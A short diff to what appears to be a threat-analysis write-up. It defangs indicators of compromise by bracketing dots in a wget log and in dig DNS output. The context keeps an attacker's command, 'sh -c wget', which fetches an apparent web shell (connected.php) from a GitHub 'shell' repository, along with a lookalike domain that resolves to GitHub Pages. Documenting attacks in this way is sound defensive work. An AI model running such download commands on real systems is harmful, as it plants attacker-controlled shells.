@@ -38,7 +38,7 @@ Had they surrounded the command with single quotes, their attempt to download `c
 
 ```bash
 sh -c 'wget https://raw.githubusercontent.com/LeviathanPerfectHunter/shell/main/connected[.]php'
---2023-08-28 19:03:50--  https://raw.githubusercontent.com/LeviathanPerfectHunter/shell/main/connected.php
+--2023-08-28 19:03:50--  https://raw.githubusercontent.com/LeviathanPerfectHunter/shell/main/connected[.]php
 Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
 Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -116,10 +116,10 @@ $ dig meki.google.co[.]ws @8.8.8.8
 
 ;; ANSWER SECTION:
 meki.google.co[.]ws.	600	IN	CNAME	suhao.github[.]io.
-suhao.github.io.	3600	IN	A	185.199.108.153
-suhao.github.io.	3600	IN	A	185.199.109.153
-suhao.github.io.	3600	IN	A	185.199.110.153
-suhao.github.io.	3600	IN	A	185.199.111.153
+suhao.github[.]io.	3600	IN	A	185.199.108.153
+suhao.github[.]io.	3600	IN	A	185.199.109.153
+suhao.github[.]io.	3600	IN	A	185.199.110.153
+suhao.github[.]io.	3600	IN	A	185.199.111.153
 
 ;; Query time: 182 msec
 ;; SERVER: 8.8.8.8#53(8.8.8.8)
